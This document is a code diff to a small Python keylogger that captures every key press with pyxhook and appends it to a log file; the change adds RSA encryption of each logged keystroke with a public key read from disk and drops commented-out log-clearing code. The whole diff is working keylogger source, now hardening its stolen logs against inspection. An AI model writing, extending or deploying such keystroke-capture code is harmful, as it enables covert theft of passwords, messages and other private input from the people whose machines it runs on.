@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 import os, sys
 import pyxhook
+from Crypto.PublicKey import RSA
 
 # This tells the keylogger where the log file will go.
 # You can set the file path as an environment variable ('pylogger_file'),
@@ -12,17 +13,12 @@ log_file = os.environ.get(
 
 print("logging keystrokes to ".format(log_file))
 
-# Allow clearing the log file on start, if pylogger_clean is defined.
-# if os.environ.get('pylogger_clean', None) is not None:
-#     try:
-#         os.remove(log_file)
-#     except EnvironmentError:
-#         # File does not exist, or no permissions.
-#         pass
+with open('keys/key.pub', 'r') as f:
+    public_key = RSA.importKey(f.read())
 
 def OnKeyPress(event):
     with open(log_file, 'a') as f:
-        f.write('{}\n'.format(event.Key))
+        f.write(public_key.encrypt('{}\n'.format(event.Key), "")[0])
 
 hook = pyxhook.HookManager()
 hook.KeyDown = OnKeyPress
